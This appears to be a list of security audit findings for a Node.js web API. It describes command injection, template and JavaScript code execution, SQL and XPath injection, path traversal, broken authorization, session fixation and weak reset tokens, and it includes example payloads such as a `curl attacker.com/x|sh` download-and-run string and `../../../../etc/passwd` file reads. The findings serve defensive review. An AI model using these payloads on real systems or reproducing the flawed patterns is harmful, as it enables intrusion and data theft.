extra.message: exportComplianceCertificate() builds a shell command string with `spawn(\`openssl x509 -in ${sourcePath} -outform ${certFormat} -out ${outputPath}\`, { shell: true })`. `certFormat` comes directly from the unvalidated request body (`@Body('certFormat')` in api-keys.controller.ts complianceCertificate()) and is executed with `shell: true`, so shell metacharacters (`;`, `$()`, backticks) in certFormat let an attacker run arbitrary OS commands. The sibling method previewComplianceCertificateExport() validates certFormat against an allow-list and uses execFileSync with an argument array (shell:false), confirming this path is the unguarded one.

renderBoardPacket() runs `execSync(\`pandoc ${sourcePath} -o ${outputPath} --template=${boardTemplate}\`)` where `boardTemplate` is taken directly from the unvalidated `layout` query parameter (exports.controller.ts boardPacket()). execSync spawns a shell, so an attacker-controlled layout value like `x --template=$(curl attacker.com/x|sh)` or containing `;` results in arbitrary command execution on the server.

previewCustomWeighting() executes `new Function('context', \`with (context) { return (${rule}); }\`)(context)` where `rule` is taken directly from the unvalidated `rule` query parameter (deals.controller.ts weightingPreview()). This evaluates arbitrary attacker-supplied JavaScript on the server, e.g. `rule=require('child_process').execSync('id')` (Node's `require` is reachable from the function scope), giving full remote code execution.

renderRenewalOutreachMessage() calls `Handlebars.compile(templateContent)` where `templateContent` is the raw, attacker-controlled request body (organizations.controller.ts renewalOutreach(), `@Body('templateContent')`). Handlebars templates can reach `constructor.constructor` to execute arbitrary code (a well-known Handlebars SSTI/RCE gadget), so this compiles and renders a fully attacker-controlled template. The sibling escalations.service.ts generateCustomerResolutionNotice() only ever compiles a fixed, hardcoded template string, confirming the difference is intentional.

extra.message: findDuplicateCandidates() builds a raw SQL string via template literal interpolation of `organizationId`, `originalName`, and `mimeType` and executes it with `this.docRepo.query(query)`. `originalName`/`mimeType` come straight from the uploaded file's client-supplied metadata and `organizationId` from an untyped `dto: any` body (documents.controller.ts create()), so an attacker can break out of the string literals to inject arbitrary SQL, e.g. via a filename like `x', '') OR 1=1; --`.

findInLegacyIndex() concatenates the attacker-controlled `x-catalog-term` header value (documents.controller.ts searchLegacyIndex()) directly into an XPath expression with no escaping at all: `//document[contains(name, '${searchTerm}') or contains(tag, '${searchTerm}')]`. A value like `x') or contains(name,'` breaks out of the intended clause, allowing arbitrary XPath injection against the legacy index document.

findInLegacyCaseArchive() builds an XPath expression from the attacker-controlled `x-case-reference` header (escalations.controller.ts searchLegacyCaseArchive()) using escapeXPathString() (line 38-40), which prefixes backslashes before quotes. XPath 1.0 string literals have no backslash-escape mechanism, so a single-quote in the input still terminates the literal early (e.g. `foo\'` still closes the string at the quote) — the 'escaping' does not actually neutralize the injection, letting an attacker inject arbitrary XPath predicates.

loadCaseAttachment(fileName) joins the raw, attacker-controlled `fileName` route param (escalations.controller.ts getAttachment(), GET /escalations/attachments/:fileName) into a path with no normalization/containment check, then reads it with fs.readFileSync. A value like `../../../../etc/passwd` reads arbitrary files on the host. The sibling loadCaseAttachmentVerified() resolves the path and checks it stays inside the base directory, confirming this unverified path is the vulnerable one.

loadQuickReplyTemplate(templateName) joins the raw, attacker-controlled `templateName` body field (escalations.controller.ts previewQuickReply(), POST /escalations/quick-replies/preview) directly into a filesystem path and reads it, allowing arbitrary file read via `../` sequences. The sibling loadApprovedQuickReplyTemplate() calls `path.basename(templateName)` first to strip any directory components, confirming this is the unguarded twin.

uploadCaseAttachment() builds the destination filename as `${esc.id}-${file.originalname}` (line 400) and writes it with fs.writeFileSync — `file.originalname` is fully attacker-controlled multipart metadata and is never sanitized, so a filename containing `../` sequences can write the uploaded content outside CASE_ATTACHMENTS_PUBLIC_DIR. There is also no MIME-type or size restriction. The sibling uploadCaseAttachmentValidated() generates the filename server-side with crypto.randomUUID() and validates MIME type/size, confirming this is the unguarded twin.

retrieveArchivedReportSnapshot() joins the raw, attacker-controlled `reportLabel` route param (exports.controller.ts archivedSnapshot(), GET /exports/:reportLabel/archived-snapshot) into a path and reads it with fs.readFileSync, with no containment check. The sibling retrieveArchivedReportSnapshotVerified() resolves the path and verifies it stays under the archive root before reading, confirming this version is the unguarded one and vulnerable to path traversal (e.g. `reportLabel=../../../../etc/hosts%00` style traversal to any `*.csv`-suffixed path, or to any path an attacker can otherwise reach).

adjustSubscription() (PATCH /webhooks/:id/subscription) is the only endpoint in this controller missing an `@Roles(...)` decorator. RolesGuard.canActivate() returns true when no roles are set on the handler, so any authenticated user of any role — including CUSTOMER_CONTACT — can call it. The underlying service method adjustWebhookSubscription() (webhooks.service.ts lines 65-68) performs no organization-ownership or role check either, unlike update() just above it which checks `wh.organizationId !== actor.organizationId`. Together this lets any authenticated user modify the events/isActive subscription of any organization's webhook.

getDeliveryDetailForPortal() gates CUSTOMER_CONTACT access using a client-supplied, unsigned cookie value (`accountType`) instead of any server-side authorization check, and never verifies that the requested webhook (`webhookId`) belongs to the caller's organization at all (unlike getDeliveryDigestForPortal() just below it, which checks `wh.organizationId !== user.organizationId`). Any customer contact can set `Cookie: accountType=enterprise-portal-owner` to satisfy the check and then read webhook delivery details for any organization's webhook by id.

extra.message: checkInAtSiteKiosk() accepts a client-supplied `kioskSessionId` and uses it verbatim as the session key stored server-side (`siteKioskSessions.set(kioskSessionId, ...)`) and as the cookie value sent back to the browser. Because the session identifier originates from the client rather than being generated server-side, an attacker can pre-choose a session id, get a victim to authenticate through this endpoint using it (or a shared kiosk device), and then use the same known id to hijack the resulting session. The sibling checkInFromFieldDevice() explicitly discards the client-supplied id and mints a fresh one with `crypto.randomBytes(32)`, confirming the kiosk path is the vulnerable, unguarded twin.

sendPasswordResetEmail() generates the password-reset token with `Math.random().toString(36)...` — a non-cryptographic, predictable PRNG — and uses it as the sole credential to reset any account's password via confirmPasswordReset(). Math.random() output can be predicted/brute-forced, unlike the codebase's own email-verification code (`crypto.randomInt`) and field-device session id (`crypto.randomBytes`), which correctly use the `crypto` module for security-sensitive tokens.
